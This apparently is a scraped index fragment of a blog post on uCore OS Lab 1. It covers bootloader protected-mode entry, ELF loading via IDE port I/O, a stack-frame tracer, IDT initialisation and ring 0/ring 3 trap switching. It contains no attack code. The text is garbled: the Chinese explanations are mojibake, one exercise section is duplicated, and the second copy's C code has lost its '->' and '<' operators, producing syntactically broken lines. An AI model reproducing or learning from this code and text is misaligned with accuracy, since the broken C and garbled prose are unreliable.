å›åˆ°bootloaderçš„ä»£ç  # Switch from real to protected mode, using a bootstrap GDT # and segment translation that makes virtual addresses # identical to physical addresses, so that the # effective memory map does not change during the switch. lgdt gdtdesc movl %cr0, %eax orl $CR0_PE_ON, %eax movl %eax, %cr0 åœ¨å¼€å¯A20ä¹‹åï¼ŒåŠ è½½äº†GDTå…¨å±€æè¿°ç¬¦è¡¨ï¼Œå®ƒæ˜¯è¢«é™æ€å‚¨å­˜åœ¨å¼•å¯¼åŒºä¸­çš„ï¼Œè½½å…¥å³å¯ã€‚ æ¥ç€ï¼Œå°†cr0å¯„å­˜å™¨çš„bit 0ç½®ä¸º1ï¼Œæ ‡å¿—ç€ä»å®æ¨¡å¼è½¬æ¢åˆ°ä¿æŠ¤æ¨¡å¼ã€‚ # Jump to next instruction, but in 32-bit code segment. # Switches processor into 32-bit mode. ljmp $PROT_MODE_CSEG, $protcseg å› ä¸ºé•¿è·³è½¬å¯ä»¥è®¾ç½®å…¶cså¯„å­˜å™¨ï¼Œæ‰€ä»¥ä½¿ç”¨ä¸€ä¸ªé•¿è·³è½¬è¿›å…¥32ä½æŒ‡ä»¤æ¨¡å¼æ‰§è¡Œã€‚ .code32 # Assemble for 32-bit mode protcseg: # Set up the protected-mode data segment registers movw $PROT_MODE_DSEG, %ax # Our data segment selector movw %ax, %ds # -\u003e DS: Data Segment movw %ax, %es # -\u003e ES: Extra Segment movw %ax, %fs # -\u003e FS movw %ax, %gs # -\u003e GS movw %ax, %ss # -\u003e SS: Stack Segment # Set up the stack pointer and call into C. The stack region is from 0--start(0x7c00) movl $0x0, %ebp movl $start, %esp call bootmain # If bootmain returns (it shouldn't), loop. spin: jmp spin è®¾ç½®å„æ®µå¯„å­˜å™¨ï¼Œå¹¶å»ºç«‹å †æ ˆï¼ˆ0~0x7c00ï¼‰ï¼Œæœ€åè¿›å…¥bootmainå‡½æ•°ï¼ˆin bootmain.cï¼‰ä¸­ã€‚ ","date":"2021-07-10","objectID":"/ucore-lab-1/:3:2","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#å¦‚ä½•åˆå§‹åŒ–gdtè¡¨"},{"categories":["Pwning"],"content":"ç»ƒä¹ 4åˆ†æbootloaderåŠ è½½ELFæ ¼å¼çš„OSçš„è¿‡ç¨‹ unsigned int SECTSIZE = 512 ; struct elfhdr * ELFHDR = ((struct elfhdr *)0x10000) ; // scratch space /* bootmain - the entry of bootloader */ void bootmain(void) { // read the 1st page off disk readseg((uintptr_t)ELFHDR, SECTSIZE * 8, 0); // is this a valid ELF? if (ELFHDR-\u003ee_magic != ELF_MAGIC) { goto bad; } struct proghdr *ph, *eph; // load each program segment (ignores ph flags) ph = (struct proghdr *)((uintptr_t)ELFHDR + ELFHDR-\u003ee_phoff); eph = ph + ELFHDR-\u003ee_phnum; for (; ph \u003c eph; ph ++) { readseg(ph-\u003ep_va \u0026 0xFFFFFF, ph-\u003ep_memsz, ph-\u003ep_offset); } // call the entry point from the ELF header // note: does not return ((void (*)(void))(ELFHDR-\u003ee_entry \u0026 0xFFFFFF))(); bad: outw(0x8A00, 0x8A00); outw(0x8A00, 0x8E00); /* do nothing */ while (1); } é¦–å…ˆï¼Œä»ç¡¬ç›˜è¯»å–ä¸€é¡µï¼ˆ512*8ï¼‰çš„å†…å®¹åŠ è½½åˆ°0x10000ã€‚ ç°åœ¨è€ƒè™‘å®ƒæ˜¯å¦‚ä½•è¯»å–çš„ï¼Ÿ bootloaderè®©CPUè¿›å…¥ä¿æŠ¤æ¨¡å¼åï¼Œä¸‹ä¸€æ­¥çš„å·¥ä½œå°±æ˜¯ä»ç¡¬ç›˜ä¸ŠåŠ è½½å¹¶è¿è¡ŒOSã€‚è€ƒè™‘åˆ°å®ç°çš„ç®€å•æ€§ï¼Œbootloaderçš„è®¿é—®ç¡¬ç›˜éƒ½æ˜¯LBAæ¨¡å¼çš„PIOï¼ˆProgram IOï¼‰æ–¹å¼ï¼Œå³æ‰€æœ‰çš„IOæ“ä½œæ˜¯é€šè¿‡CPUè®¿é—®ç¡¬ç›˜çš„IOåœ°å€å¯„å­˜å™¨å®Œæˆã€‚ ä¸€èˆ¬ä¸»æ¿æœ‰2ä¸ªIDEé€šé“ï¼Œæ¯ä¸ªé€šé“å¯ä»¥æ¥2ä¸ªIDEç¡¬ç›˜ã€‚è®¿é—®ç¬¬ä¸€ä¸ªç¡¬ç›˜çš„æ‰‡åŒºå¯è®¾ç½®IOåœ°å€å¯„å­˜å™¨0x1f0-0x1f7å®ç°çš„ï¼Œå…·ä½“å‚æ•°è§ä¸‹è¡¨ã€‚ä¸€èˆ¬ç¬¬ä¸€ä¸ªIDEé€šé“é€šè¿‡è®¿é—®IOåœ°å€0x1f0-0x1f7æ¥å®ç°ï¼Œç¬¬äºŒä¸ªIDEé€šé“é€šè¿‡è®¿é—®0x170-0x17få®ç°ã€‚æ¯ä¸ªé€šé“çš„ä¸»ä»ç›˜çš„é€‰æ‹©é€šè¿‡ç¬¬6ä¸ªIOåç§»åœ°å€å¯„å­˜å™¨æ¥è®¾ç½®ã€‚ ç¬¬6ä½ï¼šä¸º1=LBAæ¨¡å¼ï¼›0 = CHSæ¨¡å¼ ç¬¬7ä½å’Œç¬¬5ä½å¿…é¡»ä¸º1 IOåœ°å€ åŠŸèƒ½ 0x1f0 è¯»æ•°æ®ï¼Œå½“0x1f7ä¸ä¸ºå¿™çŠ¶æ€æ—¶ï¼Œå¯ä»¥è¯»ã€‚ 0x1f2 è¦è¯»å†™çš„æ‰‡åŒºæ•°ï¼Œæ¯æ¬¡è¯»å†™å‰ï¼Œä½ éœ€è¦è¡¨æ˜ä½ è¦è¯»å†™å‡ ä¸ªæ‰‡åŒºã€‚æœ€å°æ˜¯1ä¸ªæ‰‡åŒº 0x1f3 å¦‚æœæ˜¯LBAæ¨¡å¼ï¼Œå°±æ˜¯LBAå‚æ•°çš„0-7ä½ 0x1f4 å¦‚æœæ˜¯LBAæ¨¡å¼ï¼Œå°±æ˜¯LBAå‚æ•°çš„8-15ä½ 0x1f5 å¦‚æœæ˜¯LBAæ¨¡å¼ï¼Œå°±æ˜¯LBAå‚æ•°çš„16-23ä½ 0x1f6 ç¬¬0~3ä½ï¼šå¦‚æœæ˜¯LBAæ¨¡å¼å°±æ˜¯24-27ä½ ç¬¬4ä½ï¼šä¸º0ä¸»ç›˜ï¼›ä¸º1ä»ç›˜ 0x1f7 çŠ¶æ€å’Œå‘½ä»¤å¯„å­˜å™¨ã€‚æ“ä½œæ—¶å…ˆç»™å‘½ä»¤ï¼Œå†è¯»å–ï¼Œå¦‚æœä¸æ˜¯å¿™çŠ¶æ€å°±ä»0x1f0ç«¯å£è¯»æ•°æ® å½“å‰ ç¡¬ç›˜æ•°æ®æ˜¯å‚¨å­˜åˆ°ç¡¬ç›˜æ‰‡åŒºä¸­ï¼Œä¸€ä¸ªæ‰‡åŒºå¤§å°ä¸º512å­—èŠ‚ã€‚è¯»ä¸€ä¸ªæ‰‡åŒºçš„æµç¨‹å¤§è‡´å¦‚ä¸‹ï¼š ç­‰å¾…ç£ç›˜å‡†å¤‡å¥½ å‘å‡ºè¯»å–æ‰‡åŒºçš„å‘½ä»¤ ç­‰å¾…ç£ç›˜å‡†å¤‡å¥½ æŠŠç£ç›˜æ‰‡åŒºæ•°æ®è¯»åˆ°æŒ‡å®šå†…å­˜ åœ¨cä»£ç ä¸­æ˜¯è¿™æ ·å®ç°çš„ï¼Œreadseg()æ˜¯readsect()çš„ä¸€ä¸ªå°è£…ï¼š /* readsect - read a single sector at @secno into @dst */ static void readsect(void *dst, uint32_t secno) { // wait for disk to be ready waitdisk(); outb(0x1F2, 1); // count = 1 outb(0x1F3, secno \u0026 0xFF); outb(0x1F4, (secno \u003e\u003e 8) \u0026 0xFF); outb(0x1F5, (secno \u003e\u003e 16) \u0026 0xFF); outb(0x1F6, ((secno \u003e\u003e 24) \u0026 0xF) | 0xE0); outb(0x1F7, 0x20); // cmd 0x20 - read sectors // wait for disk to be ready waitdisk(); // read a sector insl(0x1F0, dst, SECTSIZE / 4); } /* waitdisk - wait for disk ready */ static void waitdisk(void) { while ((inb(0x1F7) \u0026 0xC0) != 0x40) /* do nothing */; } static inline void outb(uint16_t port, uint8_t data) { asm volatile (\"outb %0, %1\" :: \"a\" (data), \"d\" (port) : \"memory\"); } åŠ è½½åˆ°ç£ç›˜åï¼Œåˆ¤æ–­å…¶æ˜¯å¦æ˜¯ä¸€ä¸ªåˆæ³•çš„ELFï¼š // is this a valid ELF? if (ELFHDR-\u003ee_magic != ELF_MAGIC) { goto bad; } å¦‚æœåˆæ³•åˆ™ï¼š // load each program segment (ignores ph flags) // åœ¨ELFæ–‡ä»¶å¤´ä¸­ï¼Œæœ‰æè¿°ç¬¦è¡¨è®°å½•äº†ELFæ–‡ä»¶åº”è¯¥åŠ è½½åˆ°ä»€ä¹ˆä½ç½® // å°†æè¿°ç¬¦è¡¨ä¿å­˜åˆ°phä¸­ ph = (struct proghdr *)((uintptr_t)ELFHDR + ELFHDR-\u003ee_phoff); eph = ph + ELFHDR-\u003ee_phnum; // æŒ‰ç…§æè¿°è¡¨å°†ELFæ–‡ä»¶ä¸­æ•°æ®è½½å…¥å†…å­˜ for (; ph \u003c eph; ph ++) { readseg(ph-\u003ep_va \u0026 0xFFFFFF, ph-\u003ep_memsz, ph-\u003ep_offset); } // call the entry point from the ELF header // note: does not return // å†…æ ¸å…¥å£ ((void (*)(void))(ELFHDR-\u003ee_entry \u0026 0xFFFFFF))(); ","date":"2021-07-10","objectID":"/ucore-lab-1/:4:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#ç»ƒä¹ 4"},{"categories":["Pwning"],"content":"ç»ƒä¹ 4åˆ†æbootloaderåŠ è½½ELFæ ¼å¼çš„OSçš„è¿‡ç¨‹ unsigned int SECTSIZE = 512 ; struct elfhdr * ELFHDR = ((struct elfhdr *)0x10000) ; // scratch space /* bootmain - the entry of bootloader */ void bootmain(void) { // read the 1st page off disk readseg((uintptr_t)ELFHDR, SECTSIZE * 8, 0); // is this a valid ELF? if (ELFHDR-e_magic != ELF_MAGIC) { goto bad; } struct proghdr *ph, *eph; // load each program segment (ignores ph flags) ph = (struct proghdr *)((uintptr_t)ELFHDR + ELFHDR-e_phoff); eph = ph + ELFHDR-e_phnum; for (; ph p_va \u0026 0xFFFFFF, ph-p_memsz, ph-p_offset); } // call the entry point from the ELF header // note: does not return ((void (*)(void))(ELFHDR-e_entry \u0026 0xFFFFFF))(); bad: outw(0x8A00, 0x8A00); outw(0x8A00, 0x8E00); /* do nothing */ while (1); } é¦–å…ˆï¼Œä»ç¡¬ç›˜è¯»å–ä¸€é¡µï¼ˆ512*8ï¼‰çš„å†…å®¹åŠ è½½åˆ°0x10000ã€‚ ç°åœ¨è€ƒè™‘å®ƒæ˜¯å¦‚ä½•è¯»å–çš„ï¼Ÿ bootloaderè®©CPUè¿›å…¥ä¿æŠ¤æ¨¡å¼åï¼Œä¸‹ä¸€æ­¥çš„å·¥ä½œå°±æ˜¯ä»ç¡¬ç›˜ä¸ŠåŠ è½½å¹¶è¿è¡ŒOSã€‚è€ƒè™‘åˆ°å®ç°çš„ç®€å•æ€§ï¼Œbootloaderçš„è®¿é—®ç¡¬ç›˜éƒ½æ˜¯LBAæ¨¡å¼çš„PIOï¼ˆProgram IOï¼‰æ–¹å¼ï¼Œå³æ‰€æœ‰çš„IOæ“ä½œæ˜¯é€šè¿‡CPUè®¿é—®ç¡¬ç›˜çš„IOåœ°å€å¯„å­˜å™¨å®Œæˆã€‚ ä¸€èˆ¬ä¸»æ¿æœ‰2ä¸ªIDEé€šé“ï¼Œæ¯ä¸ªé€šé“å¯ä»¥æ¥2ä¸ªIDEç¡¬ç›˜ã€‚è®¿é—®ç¬¬ä¸€ä¸ªç¡¬ç›˜çš„æ‰‡åŒºå¯è®¾ç½®IOåœ°å€å¯„å­˜å™¨0x1f0-0x1f7å®ç°çš„ï¼Œå…·ä½“å‚æ•°è§ä¸‹è¡¨ã€‚ä¸€èˆ¬ç¬¬ä¸€ä¸ªIDEé€šé“é€šè¿‡è®¿é—®IOåœ°å€0x1f0-0x1f7æ¥å®ç°ï¼Œç¬¬äºŒä¸ªIDEé€šé“é€šè¿‡è®¿é—®0x170-0x17få®ç°ã€‚æ¯ä¸ªé€šé“çš„ä¸»ä»ç›˜çš„é€‰æ‹©é€šè¿‡ç¬¬6ä¸ªIOåç§»åœ°å€å¯„å­˜å™¨æ¥è®¾ç½®ã€‚ ç¬¬6ä½ï¼šä¸º1=LBAæ¨¡å¼ï¼›0 = CHSæ¨¡å¼ ç¬¬7ä½å’Œç¬¬5ä½å¿…é¡»ä¸º1 IOåœ°å€ åŠŸèƒ½ 0x1f0 è¯»æ•°æ®ï¼Œå½“0x1f7ä¸ä¸ºå¿™çŠ¶æ€æ—¶ï¼Œå¯ä»¥è¯»ã€‚ 0x1f2 è¦è¯»å†™çš„æ‰‡åŒºæ•°ï¼Œæ¯æ¬¡è¯»å†™å‰ï¼Œä½ éœ€è¦è¡¨æ˜ä½ è¦è¯»å†™å‡ ä¸ªæ‰‡åŒºã€‚æœ€å°æ˜¯1ä¸ªæ‰‡åŒº 0x1f3 å¦‚æœæ˜¯LBAæ¨¡å¼ï¼Œå°±æ˜¯LBAå‚æ•°çš„0-7ä½ 0x1f4 å¦‚æœæ˜¯LBAæ¨¡å¼ï¼Œå°±æ˜¯LBAå‚æ•°çš„8-15ä½ 0x1f5 å¦‚æœæ˜¯LBAæ¨¡å¼ï¼Œå°±æ˜¯LBAå‚æ•°çš„16-23ä½ 0x1f6 ç¬¬0~3ä½ï¼šå¦‚æœæ˜¯LBAæ¨¡å¼å°±æ˜¯24-27ä½ ç¬¬4ä½ï¼šä¸º0ä¸»ç›˜ï¼›ä¸º1ä»ç›˜ 0x1f7 çŠ¶æ€å’Œå‘½ä»¤å¯„å­˜å™¨ã€‚æ“ä½œæ—¶å…ˆç»™å‘½ä»¤ï¼Œå†è¯»å–ï¼Œå¦‚æœä¸æ˜¯å¿™çŠ¶æ€å°±ä»0x1f0ç«¯å£è¯»æ•°æ® å½“å‰ ç¡¬ç›˜æ•°æ®æ˜¯å‚¨å­˜åˆ°ç¡¬ç›˜æ‰‡åŒºä¸­ï¼Œä¸€ä¸ªæ‰‡åŒºå¤§å°ä¸º512å­—èŠ‚ã€‚è¯»ä¸€ä¸ªæ‰‡åŒºçš„æµç¨‹å¤§è‡´å¦‚ä¸‹ï¼š ç­‰å¾…ç£ç›˜å‡†å¤‡å¥½ å‘å‡ºè¯»å–æ‰‡åŒºçš„å‘½ä»¤ ç­‰å¾…ç£ç›˜å‡†å¤‡å¥½ æŠŠç£ç›˜æ‰‡åŒºæ•°æ®è¯»åˆ°æŒ‡å®šå†…å­˜ åœ¨cä»£ç ä¸­æ˜¯è¿™æ ·å®ç°çš„ï¼Œreadseg()æ˜¯readsect()çš„ä¸€ä¸ªå°è£…ï¼š /* readsect - read a single sector at @secno into @dst */ static void readsect(void *dst, uint32_t secno) { // wait for disk to be ready waitdisk(); outb(0x1F2, 1); // count = 1 outb(0x1F3, secno \u0026 0xFF); outb(0x1F4, (secno 8) \u0026 0xFF); outb(0x1F5, (secno 16) \u0026 0xFF); outb(0x1F6, ((secno 24) \u0026 0xF) | 0xE0); outb(0x1F7, 0x20); // cmd 0x20 - read sectors // wait for disk to be ready waitdisk(); // read a sector insl(0x1F0, dst, SECTSIZE / 4); } /* waitdisk - wait for disk ready */ static void waitdisk(void) { while ((inb(0x1F7) \u0026 0xC0) != 0x40) /* do nothing */; } static inline void outb(uint16_t port, uint8_t data) { asm volatile (\"outb %0, %1\" :: \"a\" (data), \"d\" (port) : \"memory\"); } åŠ è½½åˆ°ç£ç›˜åï¼Œåˆ¤æ–­å…¶æ˜¯å¦æ˜¯ä¸€ä¸ªåˆæ³•çš„ELFï¼š // is this a valid ELF? if (ELFHDR-e_magic != ELF_MAGIC) { goto bad; } å¦‚æœåˆæ³•åˆ™ï¼š // load each program segment (ignores ph flags) // åœ¨ELFæ–‡ä»¶å¤´ä¸­ï¼Œæœ‰æè¿°ç¬¦è¡¨è®°å½•äº†ELFæ–‡ä»¶åº”è¯¥åŠ è½½åˆ°ä»€ä¹ˆä½ç½® // å°†æè¿°ç¬¦è¡¨ä¿å­˜åˆ°phä¸­ ph = (struct proghdr *)((uintptr_t)ELFHDR + ELFHDR-e_phoff); eph = ph + ELFHDR-e_phnum; // æŒ‰ç…§æè¿°è¡¨å°†ELFæ–‡ä»¶ä¸­æ•°æ®è½½å…¥å†…å­˜ for (; ph p_va \u0026 0xFFFFFF, ph-p_memsz, ph-p_offset); } // call the entry point from the ELF header // note: does not return // å†…æ ¸å…¥å£ ((void (*)(void))(ELFHDR-e_entry \u0026 0xFFFFFF))(); ","date":"2021-07-10","objectID":"/ucore-lab-1/:4:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#åˆ†æbootloaderåŠ è½½elfæ ¼å¼çš„osçš„è¿‡ç¨‹"},{"categories":["Pwning"],"content":"ç»ƒä¹ 5å®ç°å‡½æ•°è°ƒç”¨å †æ ˆè·Ÿè¸ªå‡½æ•° void print_stackframe(void) { uint32_t ebp = read_ebp(); uint32_t eip = read_eip(); for(uint32_t i = 0; ebp != 0 \u0026\u0026 i \u003c STACKFRAME_DEPTH; i++) { cprintf(\"ebp: 0x%08x eip: 0x%08x, arg:\", ebp, eip); uint32_t *arg = (uint32_t *)ebp + 2; for(uint32_t j = 0; j\u003c 4; j++) { cprintf(\"0x%08x \", arg[j]); } cprintf(\"\\n\"); print_debuginfo(eip - 1); eip = *((uint32_t *)ebp + 1); ebp = *(uint32_t *)ebp; } } è¿™é‡Œéœ€è¦å¯¹32ä½cçš„å‡½æ•°è°ƒç”¨æœ‰å……åˆ†çš„ç†è§£ æ¶‰åŠåˆ°å¾ˆå¤šæŒ‡é’ˆæ“ä½œï¼Œè¿˜æœ‰ä¸€ç‚¹è¦æ³¨æ„çš„æ˜¯ï¼ŒeipæŒ‡å‘çš„æ˜¯å³å°†æ‰§è¡Œçš„æŒ‡ä»¤ï¼Œæ‰€ä»¥å¦‚æœæƒ³è¦æŸ¥çœ‹å½“å‰å‡½æ•°éœ€è¦-1ã€‚ ","date":"2021-07-10","objectID":"/ucore-lab-1/:5:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#ç»ƒä¹ 5"},{"categories":["Pwning"],"content":"ç»ƒä¹ 6å®Œå–„ä¸­æ–­åˆå§‹åŒ–å’Œå¤„ç† ä¸­æ–­æè¿°ç¬¦è¡¨ï¼ˆä¹Ÿå¯ç®€ç§°ä¸ºä¿æŠ¤æ¨¡å¼ä¸‹çš„ä¸­æ–­å‘é‡è¡¨ï¼‰ä¸­ä¸€ä¸ªè¡¨é¡¹å å¤šå°‘å­—èŠ‚ï¼Ÿå…¶ä¸­å“ªå‡ ä½ä»£è¡¨ä¸­æ–­å¤„ç†ä»£ç çš„å…¥å£ï¼Ÿ code in /kern/mm/mmu.hï¼š /* Gate descriptors for interrupts and traps */ struct gatedesc { unsigned gd_off_15_0 : 16; // low 16 bits of offset in segment unsigned gd_ss : 16; // segment selector unsigned gd_args : 5; // # args, 0 for interrupt/trap gates unsigned gd_rsv1 : 3; // reserved(should be zero I guess) unsigned gd_type : 4; // type(STS_{TG,IG32,TG32}) unsigned gd_s : 1; // must be 0 (system) unsigned gd_dpl : 2; // descriptor(meaning new) privilege level unsigned gd_p : 1; // Present unsigned gd_off_31_16 : 16; // high bits of offset in segment }; ä¸€ä¸ªè¡¨é¡¹å…±æœ‰8*8 = 64 bitå³8å­—èŠ‚ã€‚å…¶ä¸­gd_ssæ˜¯æ®µé€‰æ‹©å­ï¼Œgd_off_15_0æ˜¯åç§»ï¼Œé€šè¿‡è¿™ä¸¤é¡¹æˆ‘ä»¬å°±å¯ä»¥æ‰¾åˆ°ä¸­æ–­å¤„ç†ä»£ç çš„å…¥å£ã€‚ void idt_init(void) { extern uintptr_t __vectors[]; uint32_t i; for(i = 0; i \u003c sizeof(idt) / sizeof(struct gatedesc); i ++) { // ä½¿ç”¨å®è®¾ç½®IDTçš„æ¯ä¸€é¡¹ // IDTçš„æ¯ä¸€é¡¹éƒ½æ˜¯ä¸­æ–­ä¸”åœ¨å†…æ ¸æ€å¤„ç†çš„æ‰€ä»¥è®¾ä¸º`GD_LTEXT`ï¼Œç‰¹æƒçº§ä¸º`DPL_KERNEL` SETGATE(idt[i], 0, GD_KTEXT, __vectors[i], DPL_KERNEL); } // ç³»ç»Ÿè°ƒç”¨æ˜¯æä¾›ç»™ç”¨æˆ·ï¼Œä¾›å…¶è°ƒç”¨çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ä¿®æ”¹å…¶ç‰¹æƒçº§ï¼Œä½¿å…¶å¯ä»¥åœ¨ç”¨æˆ·æ€è°ƒç”¨ SETGATE(idt[T_SWITCH_TOK], 0, GD_KTEXT, __vectors[T_SWITCH_TOK], DPL_USER); // åŠ è½½idt lidt(\u0026idt_pd); } é™¤äº†ç³»ç»Ÿè°ƒç”¨ä¸­æ–­(T_SYSCALL)ä½¿ç”¨é™·é˜±é—¨æè¿°ç¬¦ä¸”æƒé™ä¸ºç”¨æˆ·æ€æƒé™ä»¥å¤–ï¼Œå…¶å®ƒä¸­æ–­å‡ä½¿ç”¨ç‰¹æƒçº§(DPL)ä¸ºï¼çš„ä¸­æ–­é—¨æè¿°ç¬¦ï¼Œæƒé™ä¸ºå†…æ ¸æ€æƒé™ï¼›è€Œucoreçš„åº”ç”¨ç¨‹åºå¤„äºç‰¹æƒçº§ï¼“ï¼Œéœ€è¦é‡‡ç”¨ï½€int 0x80`æŒ‡ä»¤æ“ä½œï¼ˆè¿™ç§æ–¹å¼ç§°ä¸ºè½¯ä¸­æ–­ï¼Œè½¯ä»¶ä¸­æ–­ï¼ŒTraä¸­æ–­ï¼Œåœ¨lab5ä¼šç¢°åˆ°ï¼‰æ¥å‘å‡ºç³»ç»Ÿè°ƒç”¨è¯·æ±‚ï¼Œå¹¶è¦èƒ½å®ç°ä»ç‰¹æƒçº§ï¼“åˆ°ç‰¹æƒçº§ï¼çš„è½¬æ¢ï¼Œæ‰€ä»¥ç³»ç»Ÿè°ƒç”¨ä¸­æ–­(T_SYSCALL)æ‰€å¯¹åº”çš„ä¸­æ–­é—¨æè¿°ç¬¦ä¸­çš„ç‰¹æƒçº§ï¼ˆDPLï¼‰éœ€è¦è®¾ç½®ä¸ºï¼“ã€‚ char c; switch (tf-\u003etf_trapno) { case IRQ_OFFSET + IRQ_TIMER: ticks++; if(ticks % TICK_NUM ==0) print_ticks(); break; æ¯100æ¬¡æ—¶é’Ÿä¸­æ–­è°ƒç”¨print_ticksï¼Œè¿™éƒ¨åˆ†çœ‹å…¶ä»£ç ä¸­ç»™çš„æç¤ºå¾ˆå®¹æ˜“ç¼–å†™å‡ºæ¥ï¼Œå®éªŒæŒ‡å¯¼ä¸­çš„å¾ˆæ¨¡ç³Šã€‚ ","date":"2021-07-10","objectID":"/ucore-lab-1/:6:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#ç»ƒä¹ 6"},{"categories":["Pwning"],"content":"Challenge 1 ä¸ºå®ŒæˆæŒ‘æˆ˜è¯·ä»”ç»†é˜…è¯»trapç›¸å…³çš„ä»£ç ã€testç›¸å…³ä»£ç ä»¥åŠã€Šæ“ä½œç³»ç»ŸçœŸè±¡è¿˜åŸã€‹-ç‰¹æƒçº§æ·±å…¥æµ…å‡ºä¸€ç«  åœ¨æ‰€æœ‰ä¸­æ–­å¤„ç†ç¨‹åºä¸­éƒ½ä½¿ç”¨__alltrapsï¼Œå®ƒå°†trapframeä¿å­˜åœ¨æ ˆä¸Šã€‚åœ¨ç”±å†…æ ¸æ€åˆ‡æ¢æˆç”¨æˆ·æ€çš„æ—¶å€™ï¼Œä¸€å¼€å§‹è°ƒç”¨ä¸­æ–­æ—¶ï¼Œç”±äºæ˜¯ä»å†…æ ¸æ€è°ƒç”¨çš„ï¼Œæ²¡æœ‰æƒé™åˆ‡æ¢ï¼Œæ•…ssã€espæ²¡æœ‰å‹æ ˆï¼Œè€Œiretè¿”å›æ—¶ï¼Œæ˜¯è¿”å›åˆ°ç”¨æˆ·æ€ï¼Œæ•…ssã€espä¼šå‡ºæ ˆï¼Œäºæ˜¯ä¸ºäº†ä¿è¯æ ˆçš„æ­£ç¡®æ€§ï¼Œéœ€è¦åœ¨è°ƒç”¨ä¸­æ–­å‰å°†espå‡8ä»¥é¢„ç•™ç©ºé—´ï¼Œä¸­æ–­è¿”å›åï¼Œç”±äºespè¢«ä¿®æ”¹ï¼Œè¿˜éœ€è¦æ‰‹åŠ¨æ¢å¤espä¸ºæ­£ç¡®å€¼ã€‚ è¿™æ ·ä¹‹åï¼Œç³»ç»Ÿç‰¹æƒçº§å·²ç»æˆåŠŸåˆ‡æ¢ï¼Œä½†æ˜¯ç”±äºåˆ‡æ¢åˆ°äº†ç”¨æˆ·æ€ï¼Œå¯¼è‡´IOæ“ä½œæ²¡æœ‰æƒé™ï¼Œæ•…ä¹‹åçš„printfæ— æ³•æˆåŠŸè¾“å‡ºï¼Œä¸ºäº†èƒ½å¤Ÿæ­£å¸¸è¾“å‡ºï¼Œæˆ‘ä»¬éœ€è¦å°†eflagsä¸­çš„IOPLè®¾æˆç”¨æˆ·çº§åˆ«ï¼Œå³3ï¼ŒåŒæ ·ä¹Ÿæ˜¯é€šè¿‡ä¿®æ”¹æ ˆä¸­å€¼æ¥è¾¾åˆ°ä¿®æ”¹çš„ç›®çš„ã€‚ ring3 -\u003e ring0 // å…¨å±€å˜é‡ struct trapframe switchk2u; // ...... case T_SWITCH_TOK: if (tf-\u003etf_cs != KERNEL_CS) { tf-\u003etf_cs = KERNEL_CS; // ä¿®æ”¹CPL DPL IOPL tf-\u003etf_ds = tf-\u003etf_es = KERNEL_DS; tf-\u003etf_eflags \u0026= ~FL_IOPL_MASK; // è®¡ç®—å°†è¦ä¿å­˜æ–°trapFrameçš„ç”¨æˆ·æ ˆåœ°å€ // æ•°å€¼å‡8æ˜¯å› ä¸ºå†…æ ¸è°ƒç”¨ä¸­æ–­æ—¶CPUæ²¡æœ‰å‹å…¥sså’Œesp switchu2k = (struct trapframe *)(tf-\u003etf_esp - (sizeof(struct trapframe) - 8)); // å°†ä¿®æ”¹åçš„trapFrameå†™å…¥ç”¨æˆ·æ ˆ(æ³¨æ„å½“å‰æ˜¯å†…æ ¸æ ˆ)ã€‚æ³¨æ„trapFrameä¸­sså’Œespçš„å€¼ä¸éœ€è¦å†™å…¥ã€‚ memmove(switchu2k, tf, sizeof(struct trapframe) - 8); // è®¾ç½®å¼¹å‡ºespçš„å€¼ä¸ºç”¨æˆ·æ ˆçš„æ–°åœ°å€ *((uint32_t *)tf - 1) = (uint32_t)switchu2k; } break; ring0 -\u003e ring3 // å…¨å±€å˜é‡ struct trapframe *switchu2k; // ...... case T_SWITCH_TOU: if (tf-\u003etf_cs != USER_CS) { // å°†ä¸­æ–­çš„æ ˆå¸§èµ‹ç»™ä¸´æ—¶ä¸­æ–­å¸§ switchk2u = *tf; // ä¿®æ”¹å¯æ‰§è¡Œä»£ç æ®µä¸ºUSER_CS switchk2u.tf_cs = USER_CS; // ä¿®æ”¹æ•°æ®æ®µä¸ºUSER_DS switchk2u.tf_ds = switchk2u.tf_es = switchk2u.tf_ss = USER_DS; // è®¾ç½®ä»ä¸­æ–­å¤„ç†ç¨‹åºè¿”å›æ—¶çš„æ ˆåœ°å€ // æ•°å€¼å‡8æ˜¯å› ä¸ºiretä¸ä¼šå¼¹å‡ºsså’Œespï¼Œæ‰€ä»¥ä¸éœ€è¦è¿™8ä¸ªå­—èŠ‚ switchk2u.tf_esp = (uint32_t)tf + sizeof(struct trapframe) - 8; // ä¸ºäº†ä½¿å¾—ç¨‹åºåœ¨ä½CPLçš„æƒ…å†µä¸‹ä»ç„¶èƒ½å¤Ÿä½¿ç”¨IO // éœ€è¦å°†eflagsä¸­å¯¹åº”çš„IOPLä½ç½®æˆè¡¨ç¤ºç”¨æˆ·æ€çš„3 switchk2u.tf_eflags |= FL_IOPL_MASK; // è®¾ç½®ä¸­æ–­å¤„ç†ä¾‹ç¨‹ç»“æŸæ—¶popå‡ºçš„%espï¼Œè¿™æ ·å¯ä»¥ç”¨ä¿®æ”¹åçš„æ•°æ®æ¥æ¢å¤ä¸Šä¸‹æ–‡ã€‚ *((uint32_t *)tf - 1) = (uint32_t)\u0026switchk2u; } // äº‹å®ä¸Šä¸Šè¿°ä»£ç å¹¶æ²¡æœ‰å®é™…å®Œæˆä¸€ä¸ªä»å†…æ ¸æ ˆåˆ°ç”¨æˆ·æ€æ ˆçš„åˆ‡æ¢ // ä»…ä»…æ˜¯å®Œæˆäº†ç‰¹æƒçº§çš„åˆ‡æ¢ã€‚è¿™å±äºæ­£å¸¸ç°è±¡ã€‚ break; ä¸­æ–­ static void lab1_switch_to_user(void) { asm volatile ( \"sub $0x8, %%esp \\n\" \"int %0 \\n\" \"movl %%ebp, %%esp\" : : \"i\"(T_SWITCH_TOU) ); } static void lab1_switch_to_kernel(void) { asm volatile ( \"int %0 \\n\" \"movl %%ebp, %%esp \\n\" : : \"i\"(T_SWITCH_TOK) ); } æœ€åä¸ºäº†å®ŒæˆæŒ‘æˆ˜ä¸è¦å¿˜äº†åœ¨kern_initä¸­ï¼Œå¼€å¯testã€‚ 